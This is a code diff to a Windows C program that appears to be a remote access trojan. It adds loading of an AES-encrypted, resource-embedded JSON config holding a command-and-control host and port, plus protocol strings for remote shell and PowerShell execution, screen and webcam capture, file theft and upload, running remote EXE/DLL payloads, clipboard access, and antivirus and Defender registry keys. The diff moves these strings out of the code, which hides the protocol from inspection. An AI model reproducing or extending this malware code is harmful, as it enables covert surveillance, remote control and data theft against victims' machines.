@@ -1,4 +1,5 @@
 #include "utils.h"
+#include "config.h"
 #include "cJSON.h"
 #include <wincrypt.h>
 #include <bcrypt.h>
@@ -81,7 +82,7 @@ void str_trim(char* s) {
 extern SessionKey g_session;
 
 void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
-    sock_send_ex(sock, mutex, "response", msg);
+    sock_send_ex(sock, mutex, g_conf.s_response, msg);
 }
 
 void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
@@ -286,4 +287,122 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
         month++;
     }
     sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
+}
+
+Config g_conf = {0};
+
+void load_config_from_resource() {
+    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
+    if (!hRes) return;
+
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) return;
+
+    unsigned char* pData = (unsigned char*)LockResource(hData);
+    if (!pData) return;
+
+    unsigned char marker[16];
+    SET_MARKER(marker);
+
+    if (memcmp(pData, marker, 16) != 0) return;
+
+    unsigned char* encrypted_config = pData + 16;
+    size_t config_len = 2032;
+
+    unsigned char key[32];
+    unsigned char iv[16];
+    memcpy(key, CONFIG_KEY, 32);
+    memcpy(iv, CONFIG_IV, 16);
+
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
+    PBYTE pbKeyObject = NULL, pbPlain = NULL;
+
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
+    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;
+
+    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
+    pbKeyObject = (PBYTE)malloc(cbKeyObject);
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;
+
+    BYTE ivCopy[16];
+    memcpy(ivCopy, iv, 16);
+
+    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
+        cbPlain = (DWORD)config_len;
+    }
+
+    pbPlain = malloc(cbPlain + 1);
+    memcpy(ivCopy, iv, 16);
+    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
+        pbPlain[cbResult] = 0;
+        cJSON* root = cJSON_Parse((char*)pbPlain);
+        if (root) {
+            cJSON* ip = cJSON_GetObjectItem(root, "ip");
+            cJSON* port = cJSON_GetObjectItem(root, "port");
+            if (ip) strncpy(g_conf.host, ip->valuestring, sizeof(g_conf.host) - 1);
+            if (port) g_conf.port = port->valueint;
+
+            #define MAP_STR(f, n) { cJSON* item = cJSON_GetObjectItem(root, n); if(item) strncpy(g_conf.f, item->valuestring, sizeof(g_conf.f)-1); }
+            MAP_STR(s_ping, "s_ping");
+            MAP_STR(s_pong, "s_pong");
+            MAP_STR(s_msg, "s_msg");
+            MAP_STR(s_exec_ps, "s_exec_ps");
+            MAP_STR(s_exec_cmd, "s_exec_cmd");
+            MAP_STR(s_ps_out, "s_ps_out");
+            MAP_STR(s_cmd_out, "s_cmd_out");
+            MAP_STR(s_scr_stop, "s_scr_stop");
+            MAP_STR(s_cam_stop, "s_cam_stop");
+            MAP_STR(s_tasklist, "s_tasklist");
+            MAP_STR(s_taskkill, "s_taskkill");
+            MAP_STR(s_ls, "s_ls");
+            MAP_STR(s_ls_res, "s_ls_res");
+            MAP_STR(s_download, "s_download");
+            MAP_STR(s_delete, "s_delete");
+            MAP_STR(s_mkdir, "s_mkdir");
+            MAP_STR(s_upload, "s_upload");
+            MAP_STR(s_rename, "s_rename");
+            MAP_STR(s_rfe_exe, "s_rfe_exe");
+            MAP_STR(s_rfe_dll, "s_rfe_dll");
+            MAP_STR(s_browser, "s_browser");
+            MAP_STR(s_clip_get, "s_clip_get");
+            MAP_STR(s_clip_set, "s_clip_set");
+            MAP_STR(s_uninstall, "s_uninstall");
+            MAP_STR(s_close, "s_close");
+            MAP_STR(s_reconnect, "s_reconnect");
+            MAP_STR(s_set_delay, "s_set_delay");
+            MAP_STR(s_scr_start, "s_scr_start");
+            MAP_STR(s_cam_start, "s_cam_start");
+            MAP_STR(s_sysinfo, "s_sysinfo");
+            MAP_STR(s_response, "s_response");
+            MAP_STR(s_command, "s_command");
+            MAP_STR(s_session, "s_session");
+
+            MAP_STR(s_reg_win_key, "s_reg_win_key");
+            MAP_STR(s_reg_prod_name, "s_reg_prod_name");
+            MAP_STR(s_reg_build, "s_reg_build");
+            MAP_STR(s_reg_display, "s_reg_display");
+            MAP_STR(s_reg_release, "s_reg_release");
+            MAP_STR(s_reg_av_key, "s_reg_av_key");
+            MAP_STR(s_reg_defender_key, "s_reg_defender_key");
+            MAP_STR(s_reg_dis_spy, "s_reg_dis_spy");
+            MAP_STR(s_reg_gpu_key, "s_reg_gpu_key");
+            MAP_STR(s_reg_gpu_desc, "s_reg_gpu_desc");
+            MAP_STR(s_reg_cpu_key, "s_reg_cpu_key");
+            MAP_STR(s_reg_cpu_name, "s_reg_cpu_name");
+
+            MAP_STR(s_http_ua, "s_http_ua");
+            MAP_STR(s_http_host, "s_http_host");
+            MAP_STR(s_http_path, "s_http_path");
+
+            cJSON_Delete(root);
+        }
+    }
+
+cleanup:
+    if (pbPlain) free(pbPlain);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (pbKeyObject) free(pbKeyObject);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
 }
